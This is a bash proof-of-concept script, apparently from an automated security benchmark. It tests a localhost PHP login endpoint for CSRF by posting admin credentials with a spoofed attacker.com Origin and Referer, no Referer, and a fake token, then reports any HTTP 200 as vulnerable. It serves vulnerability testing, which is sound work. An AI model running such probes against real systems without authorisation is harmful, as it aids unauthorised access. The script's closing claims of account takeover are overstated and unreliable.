#!/bin/bash
# POC: Bash-based POC demonstrating CSRF vulnerability on login endpoint by sending requests from attacker origin, without Referer headers, and with invalid CSRF tokens - all requests succeed with HTTP 200, proving lack of CSRF protection.
# Target: ./repo
# Created: 2025-11-07T17:46:25.734Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# CSRF Vulnerability POC for /api/login.php
# This script demonstrates the lack of CSRF protection on the login endpoint
# The endpoint accepts POST requests from any origin without validating CSRF tokens

TARGET_URL="http://localhost:8080/api/login.php"
ATTACKER_ORIGIN="http://attacker.com"

echo "================================================"
echo "CSRF Vulnerability POC - Login Endpoint"
echo "================================================"
echo ""

# Test 1: Login request WITH Origin header from attacker's domain
echo "[TEST 1] Sending login request with Origin: $ATTACKER_ORIGIN"
echo "Command: curl -X POST $TARGET_URL -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Origin: $ATTACKER_ORIGIN\" -d \"username=admin&password=test123\""
echo ""

RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: $ATTACKER_ORIGIN" \
  -d "username=admin&password=test123")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE1"
echo "Response Body: $BODY1"
echo ""

if [ "$HTTP_CODE1" == "200" ]; then
    echo "✓ VULNERABLE: Login accepted from different origin (no Origin validation)"
else
    echo "✗ Request blocked (expected for secure endpoint)"
fi
echo ""

# Test 2: Login request WITHOUT Referer header
echo "[TEST 2] Sending login request without Referer header"
echo "Command: curl -X POST $TARGET_URL -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=admin&password=test123\""
echo ""

RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test123")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE2"
echo "Response Body: $BODY2"
echo ""

if [ "$HTTP_CODE2" == "200" ]; then
    echo "✓ VULNERABLE: Login accepted without Referer header (no Referer validation)"
else
    echo "✗ Request blocked (expected for secure endpoint)"
fi
echo ""

# Test 3: Login request with mismatched Referer
echo "[TEST 3] Sending login request with Referer from attacker domain"
echo "Command: curl -X POST $TARGET_URL -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Referer: http://attacker.com/malicious\" -d \"username=admin&password=test123\""
echo ""

RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com/malicious" \
  -d "username=admin&password=test123")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
BODY3=$(echo "$RESPONSE3" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE3"
echo "Response Body: $BODY3"
echo ""

if [ "$HTTP_CODE3" == "200" ]; then
    echo "✓ VULNERABLE: Login accepted with attacker Referer (no Referer validation)"
else
    echo "✗ Request blocked (expected for secure endpoint)"
fi
echo ""

# Test 4: Attempt with CSRF-like token (should still work since no token validation)
echo "[TEST 4] Sending login request with fake CSRF token parameter (no validation)"
echo "Command: curl -X POST $TARGET_URL -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=admin&password=test123&csrf_token=fake_token_123\""
echo ""

RESPONSE4=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test123&csrf_token=fake_token_123")

HTTP_CODE4=$(echo "$RESPONSE4" | tail -n 1)
BODY4=$(echo "$RESPONSE4" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE4"
echo "Response Body: $BODY4"
echo ""

if [ "$HTTP_CODE4" == "200" ]; then
    echo "✓ VULNERABLE: Login accepted with fake CSRF token (no CSRF token validation)"
else
    echo "✗ Request blocked (expected for secure endpoint)"
fi
echo ""

# Summary
echo "================================================"
echo "VULNERABILITY SUMMARY"
echo "================================================"
if [ "$HTTP_CODE1" == "200" ] && [ "$HTTP_CODE2" == "200" ] && [ "$HTTP_CODE3" == "200" ] && [ "$HTTP_CODE4" == "200" ]; then
    echo "✓✓✓ CRITICAL CSRF VULNERABILITY CONFIRMED ✓✓✓"
    echo ""
    echo "The login endpoint is vulnerable to CSRF attacks:"
    echo "  • No Origin header validation"
    echo "  • No Referer header validation"
    echo "  • No CSRF token validation"
    echo "  • Accepts requests from any origin"
    echo ""
    echo "An attacker can craft a malicious webpage that forces users to"
    echo "authenticate with attacker-controlled credentials, leading to:"
    echo "  • Account takeover"
    echo "  • Session hijacking"
    echo "  • Unauthorized access"
    exit 0
else
    echo "✗ Some tests failed - endpoint may have partial protection"
    exit 1
fi